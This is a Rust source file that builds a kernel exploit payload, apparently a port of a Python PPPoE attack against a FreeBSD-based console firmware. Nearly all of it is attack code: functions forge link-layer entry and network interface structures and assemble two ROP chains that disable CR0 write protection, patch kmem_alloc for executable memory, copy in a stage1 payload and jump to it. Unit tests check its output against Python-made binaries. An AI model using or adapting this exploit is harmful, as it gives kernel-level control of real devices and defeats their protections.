use super::offsets::OFFSETS_FW_1100;
use crate::constants;

/// Creates the Link-Layer Entry
/// The LLE (link layer entry) table stores information about hosts on a network
/// and is used to translate between network layer addresses and data link layer
/// addresses. This is a malicious entry for it.
/// The link layer entry struct is defined in the FreeBSD kernel
/// `freebsd-src/sys/net/if_llatbl.h`
pub fn build_overflow_lle(pppoe_softc: u64) -> Vec<u8> {
    let mut overflow_lle = Vec::new();

    // lle_next
    overflow_lle.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_AC_COOKIE).to_le_bytes()); // le_next
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // le_prev

    // lle_lock
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lo_name
    overflow_lle.extend(&(constants::RW_INIT_FLAGS | constants::LO_DUPOK).to_le_bytes()); // lo_flags
    overflow_lle.extend(&0u32.to_le_bytes()); // lo_data
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    overflow_lle.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock

    // lle_tbl
    overflow_lle.extend(
        &(pppoe_softc + constants::PPPOE_SOFTC_SC_AC_COOKIE - constants::LLTABLE_LLTIFP)
            .to_le_bytes(),
    ); // lle_tbl
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lle_head
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // lle_free
    overflow_lle.extend(&constants::ZERO.to_le_bytes()); // la_hold
    overflow_lle.extend(&0u32.to_le_bytes()); // la_numheld
    overflow_lle.extend(&0u32.to_le_bytes()); // pad
    overflow_lle.extend(&0u64.to_le_bytes()); // la_expire

    // la_flags and remaining fields
    overflow_lle.extend(&constants::LLE_EXCLUSIVE.to_le_bytes()); // la_flags
    overflow_lle.extend(&0u16.to_le_bytes()); // la_asked
    overflow_lle.extend(&0u16.to_le_bytes()); // la_preempt
    overflow_lle.extend(&0u16.to_le_bytes()); // ln_byhint
    overflow_lle.extend(&constants::ND6_LLINFO_NOSTATE.to_le_bytes()); // ln_state
    overflow_lle.extend(&0u16.to_le_bytes()); // ln_router
    overflow_lle.extend(&0u32.to_le_bytes()); // pad
    overflow_lle.extend(&0x7fffffffffffffff_u64.to_le_bytes()); // ln_ntick

    overflow_lle
}

pub fn build_fake_ifnet(pppoe_softc: u64) -> Vec<u8> {
    // Fake ifnet
    let mut fake_ifnet = vec![0x41; 0x48]; // Fill with 'A' initially
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // if_addrhead
    fake_ifnet.resize(0x70, 0x41); // Fill to 0x70 with 'A'
    fake_ifnet.extend(&0x0001u16.to_le_bytes()); // if_index
    fake_ifnet.resize(0xa0, 0x41); // Fill to 0xa0 with 'A'
    fake_ifnet.push(constants::IFT_ETHER); // ifi_type
    fake_ifnet.push(0); // ifi_physical
    fake_ifnet.push(0x8 + 0x1); // ifi_addrlen
    fake_ifnet.resize(0x1b8, 0x41); // Fill to 0x1b8 with 'A'

    fake_ifnet.extend(&(pppoe_softc + constants::PPPOE_SOFTC_SC_DEST).to_le_bytes()); // if_addr
    fake_ifnet.resize(0x428, 0x41); // Fill to 0x428 with 'A'
    fake_ifnet.extend(&(pppoe_softc + 0x10 - 0x8).to_le_bytes()); // nd_ifinfo
                                                                  // if_afdata_lock

    fake_ifnet.resize(0x480, 0x41); // Fill to 0x480 with 'A'
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::RW_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock
                                                              // if_addr_mtx

    fake_ifnet.resize(0x4c0, 0x41); // Fill to 0x4c0 with 'A'

    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_name
    fake_ifnet.extend(&constants::MTX_INIT_FLAGS.to_le_bytes()); // lo_flags
    fake_ifnet.extend(&0u32.to_le_bytes()); // lo_data
    fake_ifnet.extend(&constants::ZERO.to_le_bytes()); // lo_witness
    fake_ifnet.extend(&constants::MTX_UNOWNED.to_le_bytes()); // mtx_lock
    fake_ifnet
}

pub fn build_second_rop(kaslr_offset: u64, stage1_len: usize) -> Vec<u8> {
    let mut rop = Vec::new();
    // setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdi_ret).to_le_bytes());
    rop.extend(&(constants::IDT_UD).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rsi_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.add_rsp_28_pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    rop.extend(&(constants::SDT_SYSIGT).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rcx_ret).to_le_bytes());
    rop.extend(&(constants::SEL_KPL).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_r8_pop_rbp_ret).to_le_bytes());
    rop.extend(&0u64.to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.setidt).to_le_bytes());

    // Disable write protection
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rsi_ret).to_le_bytes());
    rop.extend(&(constants::CR0_ORI & !constants::CR0_WP).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_cr0_rsi_ud2_mov_eax_1_ret).to_le_bytes());

    // Enable RWX in kmem_alloc
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rax_ret).to_le_bytes());
    rop.extend(&(constants::VM_PROT_ALL).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rcx_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.kmem_alloc_patch1).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_byte_ptr_rcx_al_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rcx_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.kmem_alloc_patch2).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_byte_ptr_rcx_al_ret).to_le_bytes());

    // Restore write protection
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rsi_ret).to_le_bytes());
    rop.extend(&(constants::CR0_ORI).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_cr0_rsi_ud2_mov_eax_1_ret).to_le_bytes());

    // kmem_alloc(*kernel_map, PAGE_SIZE)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rax_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdi_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.kernel_map).to_le_bytes());
    rop.extend(
        &(kaslr_offset + OFFSETS_FW_1100.mov_rdi_qword_ptr_rdi_pop_rbp_jmp_rax).to_le_bytes(),
    );
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());

    // RSI = PAGE_SIZE
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rsi_ret).to_le_bytes());
    rop.extend(&(constants::PAGE_SIZE).to_le_bytes());

    // Call kmem_alloc
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.kmem_alloc).to_le_bytes());

    // R14 = RAX
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_r8_pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_r14_rax_call_r8).to_le_bytes());

    // memcpy(R14, stage1, len(stage1))
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_r12_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_rdi_r14_call_r12).to_le_bytes());

    // RSI = RSP + len(rop) - rop_rsp_pos
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.push_rsp_pop_rsi_ret).to_le_bytes());
    let rop_rsp_pos = rop.len();
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    let rop_off_fixup = rop.len();
    rop.extend(&0xDEADBEEF_u64.to_le_bytes()); // Placeholder
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.sub_rsi_rdx_mov_rax_rsi_pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());

    // RDX = len(stage1)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    rop.extend(&(stage1_len as u64).to_le_bytes());

    // Call memcpy
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.memcpy).to_le_bytes());

    // Jump into stage1
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.jmp_r14).to_le_bytes());

    // Fixup offset of stage1
    let stage1_fixup_value = -((rop.len() - rop_rsp_pos) as i64);
    rop[rop_off_fixup..rop_off_fixup + 8].copy_from_slice(&stage1_fixup_value.to_le_bytes());

    rop
}

pub fn build_first_rop(
    stage1_len: usize,
    fake_lle: &[u8],
    rop2: &[u8],
    kaslr_offset: u64,
) -> Vec<u8> {
    let mut rop = Vec::new();

    // RDI = RBX - 0x800
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_r12_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_rdi_rbx_call_r12).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rcx_ret).to_le_bytes());
    rop.extend(&(-0x800i64).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.add_rdi_rcx_ret).to_le_bytes());

    // RSI += len(fake_lle + rop)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    let rop_off_fixup = rop.len();
    rop.extend(&0xDEADBEEF_u64.to_le_bytes()); // Placeholder
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.sub_rsi_rdx_mov_rax_rsi_pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());

    // RDX = len(rop2 + stage1)
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    rop.extend(&(rop2.len() + stage1_len).to_le_bytes());

    // Call memcpy
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.memcpy).to_le_bytes());

    // Stack pivot
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rax_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rbp_ret).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.mov_rsi_rbx_call_rax).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.pop_rdx_ret).to_le_bytes());
    rop.extend(&(0x800u64 + 0x20u64).to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.sub_rsi_rdx_mov_rax_rsi_pop_rbp_ret).to_le_bytes());
    rop.extend(&0xDEADBEEF_u64.to_le_bytes());
    rop.extend(&(kaslr_offset + OFFSETS_FW_1100.lea_rsp_rsi_20_repz_ret).to_le_bytes());

    // Fixup offset of rop2
    let len_fixup = fake_lle.len() + rop.len();
    let fixup_value = -(len_fixup as i64);
    rop[rop_off_fixup..rop_off_fixup + 8].copy_from_slice(&fixup_value.to_le_bytes());

    rop
}

pub fn build_fake_lle(pppoe_softc: u64, kaslr_offset: u64, stage1: Vec<u8>) -> Vec<u8> {
    let planted = (kaslr_offset + OFFSETS_FW_1100.first_gadget) & 0xffffffffffff;
    let source_mac = &planted.to_le_bytes()[..6];
    println!("[+] Source MAC: {:?}", source_mac);

    // Fake in6_llentry
    let mut fake_lle = vec![0x00; 0x00]; // Initialize empty byte array

    // lle_next (Third gadget)
    fake_lle.extend(
        (kaslr_offset + OFFSETS_FW_1100.pop_rbx_pop_r14_pop_rbp_jmp_qword_ptr_rsi_10).to_le_bytes(),
    );
    fake_lle.extend(&0u64.to_le_bytes()); // lle_prev (NULL)

    // lle_lock (Fourth gadget)
    fake_lle.extend(&(kaslr_offset + OFFSETS_FW_1100.lea_rsp_rsi_20_repz_ret).to_le_bytes()); // lo_name
    fake_lle.extend(&(constants::RW_INIT_FLAGS | constants::LO_DUPOK).to_le_bytes()); // lo_flags
    fake_lle.extend(&0u32.to_le_bytes()); // lo_data
    fake_lle.extend(&(kaslr_offset + OFFSETS_FW_1100.add_rsp_b0_pop_rbp_ret).to_le_bytes()); // lo_witness
    fake_lle.extend(&constants::RW_UNLOCKED.to_le_bytes()); // rw_lock

    // lle_tbl
    fake_lle.extend(
        &(pppoe_softc + constants::PPPOE_SOFTC_SC_DEST - constants::LLTABLE_LLTFREE).to_le_bytes(),
    );
    fake_lle.extend(&0u64.to_le_bytes()); // lle_head (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // lle_free (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // la_hold (NULL)

    fake_lle.extend(&0u32.to_le_bytes()); // la_numheld
    fake_lle.extend(&0u32.to_le_bytes()); // pads
    fake_lle.extend(&0u64.to_le_bytes()); // la_expire
    fake_lle.extend(&(constants::LLE_STATIC | constants::LLE_EXCLUSIVE).to_le_bytes()); // la_flags
    fake_lle.extend(&0u16.to_le_bytes()); // la_asked
    fake_lle.extend(&0u16.to_le_bytes()); // la_preempt
    fake_lle.extend(&0u16.to_le_bytes()); // ln_byhint
    fake_lle.extend(&constants::ND6_LLINFO_NOSTATE.to_le_bytes()); // ln_state
    fake_lle.extend(&0u16.to_le_bytes()); // ln_router
    fake_lle.extend(&0u32.to_le_bytes()); // pad
    fake_lle.extend(&0x7fffffffffffffffu64.to_le_bytes()); // ln_ntick
    fake_lle.extend(&0u32.to_le_bytes()); // lle_refcnt
    fake_lle.extend(&0u32.to_le_bytes()); // pad

    // ll_addr (big-endian)
    fake_lle.extend(&0x414141414141u64.to_be_bytes());

    // lle_timer
    fake_lle.extend(&0u64.to_le_bytes()); // sle
    fake_lle.extend(&0u64.to_le_bytes()); // tqe
    fake_lle.extend(&0u32.to_le_bytes()); // c_time
    fake_lle.extend(&0u32.to_le_bytes()); // pad
    fake_lle.extend(&0u64.to_le_bytes()); // c_arg (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // c_func (NULL)
    fake_lle.extend(&0u64.to_le_bytes()); // c_lock (NULL)
    fake_lle.extend(&constants::CALLOUT_RETURNUNLOCKED.to_le_bytes()); // c_flags
    fake_lle.extend(&0u32.to_le_bytes()); // c_cpu

    // l3_addr6
    fake_lle.extend(&constants::SOCKADDR_IN6_SIZE.to_le_bytes()); // sin6_len
    fake_lle.extend(&constants::AF_INET6.to_le_bytes()); // sin6_family
    fake_lle.extend(&0u16.to_le_bytes()); // sin6_port
    fake_lle.extend(&0u32.to_le_bytes()); // sin6_flowinfo
    fake_lle.extend(&0xfe80000100000000u64.to_be_bytes()); // sin6_addr (big-endian)
    fake_lle.extend(&0x4141414141414141u64.to_be_bytes()); // sin6_addr (big-endian)
    fake_lle.extend(&0u32.to_le_bytes()); // sin6_scope_id

    // Pad
    fake_lle.extend(&0u32.to_le_bytes());

    // Second gadget
    let second_gadget = kaslr_offset + OFFSETS_FW_1100.push_rbp_jmp_qword_ptr_rsi;
    let start: usize = OFFSETS_FW_1100.second_gadget_off.try_into().unwrap();
    let end: usize = (OFFSETS_FW_1100.second_gadget_off + 8).try_into().unwrap();
    fake_lle[start..end].copy_from_slice(&second_gadget.to_le_bytes());

    // Second ROP chain
    let rop2 = build_second_rop(kaslr_offset, stage1.len());
    // First ROP chain
    let rop = build_first_rop(stage1.len(), &fake_lle, &rop2, kaslr_offset);

    // Return the combined fake lle and ROP chains
    [fake_lle, rop, rop2, stage1.clone()].concat()
}

#[cfg(test)]
mod tests {

    use super::*;
    use std::fs::File;
    use std::io::Read;
    use std::io::Write;
    use std::io::{self};

    fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
        let mut file = File::open(file_path)?;
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)?;
        Ok(buffer) // Return the buffer
    }

    #[test]
    fn test_fake_ifnet_comparison() {
        // Generate fake ifnet using the Rust implementation
        let pppoe_softc: u64 = 0x123456789ABCDEF0;
        let rust_fake_ifnet = build_fake_ifnet(pppoe_softc);

        // Dump the fake ifnet to a file
        let mut rust_file =
            File::create("test_data/rust_fake_ifnet.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_ifnet)
            .expect("Failed to write to file");

        // Load the fake ifnet generated by Python
        let mut python_fake_ifnet = Vec::new();
        let mut python_file =
            File::open("test_data/fake_ifnet.bin").expect("Failed to open Python fake ifnet file");
        python_file
            .read_to_end(&mut python_fake_ifnet)
            .expect("Failed to read Python fake ifnet file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_ifnet.len(),
            python_fake_ifnet.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_fake_ifnet
            .iter()
            .zip(python_fake_ifnet.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_overflow_lle_comparison() {
        // Generate malicious LLE using the Rust implementation
        let pppoe_softc: u64 = 0xffffea374898a600; // Initial pppoe
        let rust_overflow_lle = build_overflow_lle(pppoe_softc);

        // Dump the malicious LLE to a file
        let mut rust_file =
            File::create("test_data/rust_overflow_lle.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_overflow_lle)
            .expect("Failed to write to file");

        // Load the malicious LLE generated by Python
        let mut python_overflow_lle = Vec::new();
        let mut python_file =
            File::open("test_data/overflow_lle.bin").expect("Failed to open Python LLE file");
        python_file
            .read_to_end(&mut python_overflow_lle)
            .expect("Failed to read Python LLE file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_overflow_lle.len(),
            python_overflow_lle.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in rust_overflow_lle
            .iter()
            .zip(python_overflow_lle.iter())
            .enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }

    #[test]
    fn test_fake_lle_comparison() {
        // Generate fake LLE using the Rust implementation
        let kaslr_offset: u64 = 0x1eca4000;
        let stage1 = read_stage("stage1/stage1.bin");
        let rust_fake_lle = build_fake_lle(0xffffea374898a600, kaslr_offset, stage1.unwrap());

        // Dump the malicious LLE to a file
        let mut rust_file =
            File::create("test_data/rust_fake_lle.bin").expect("Failed to create file");
        rust_file
            .write_all(&rust_fake_lle)
            .expect("Failed to write to file");

        // Load the malicious LLE generated by Python
        let mut python_fake_lle = Vec::new();
        let mut python_file =
            File::open("test_data/fake_lle.bin").expect("Failed to open Python LLE file");
        python_file
            .read_to_end(&mut python_fake_lle)
            .expect("Failed to read Python LLE file");

        // Compare the lengths of the two files
        assert_eq!(
            rust_fake_lle.len(),
            python_fake_lle.len(),
            "File lengths are not equal"
        );

        // Compare the contents of the two files byte by byte
        for (idx, (rust_byte, python_byte)) in
            rust_fake_lle.iter().zip(python_fake_lle.iter()).enumerate()
        {
            assert_eq!(rust_byte, python_byte, "Byte mismatch at index {}", idx);
        }
    }
}
